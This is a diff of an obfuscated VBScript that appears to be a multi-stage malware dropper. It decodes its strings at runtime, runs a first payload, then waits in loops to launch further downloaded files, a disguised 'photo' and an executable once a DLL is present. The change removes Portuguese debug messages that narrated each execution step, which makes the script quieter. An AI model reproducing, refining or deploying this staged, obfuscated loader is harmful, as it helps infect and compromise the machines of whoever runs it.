@@ -100,14 +100,12 @@ dhf0VGA74.Close
 Set ogqpfsoIY = CreateObject(x0ZaS6D0("XHuMLI}Y:hV_*fCjM$)I?^Z[9bHbVJ"))
 ogqpfsoIY.CurrentDirectory = x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 ogqpfsoIY.Run vIBN4g0g
-wscript.echo "Criou e executou primeiro arquivo"
 wscript.sleep 1000
 retk56kw534w34 = true
 do While (retk56kw534w34 = true)
 If lRiDgJJ.FileExists(x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + kZgPyx) Then
     ogqpfsoIY.Run kZgPyx
     retk56kw534w34 = false
-    wscript.echo "Executou segundo arquivo (tropc - downloads)"
 end if
 wscript.sleep 1000
 Loop
@@ -118,7 +116,6 @@ do While (sXs1eM1FHX = true)
         if InStr(bWi1ZsU7,x0ZaS6D0("8_y9{e#cBf#hNeGl`#uZ")) > 0 then
             ogqpfsoIY.Run bWi1ZsU7.name
             sXs1eM1FHX = false
-            wscript.echo "Executou a foto"
             Exit For
         end if
     Next
@@ -131,7 +128,6 @@ sdgertahert = True
 do while sdgertahert = true
 If lRiDgJJ.FileExists(vSfcAXu3g) Then
     ogqpfsoIY.Run x0ZaS6D0("KDlm>_,d\hLWCh.#<nT,**2#],?&T(f$R[>n}[U!")
-    wscript.echo "Se existir a dll, executou o exe"
     sdgertahert = false
 end if
 wscript.sleep 1000
